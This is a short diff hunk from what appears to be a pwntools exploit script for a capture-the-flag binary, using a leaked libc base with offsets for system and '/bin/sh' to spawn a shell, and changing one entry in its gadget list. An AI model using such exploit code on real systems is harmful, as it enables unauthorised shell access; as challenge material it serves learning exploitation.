@@ -15,7 +15,7 @@ log.info("Leak: " + hex(leak))
 bin_sh = 0x00158e8b
 system = 0x0003a940
 random_gadget = 0x0008e5e0
-gadget = [leak + system, leak + system, leak + bin_sh]
+gadget = [leak + system, leak + random_gadget, leak + bin_sh]
 idx = 0
 p.sendlineafter(b'sort :', b'35')
 for i in range(35):
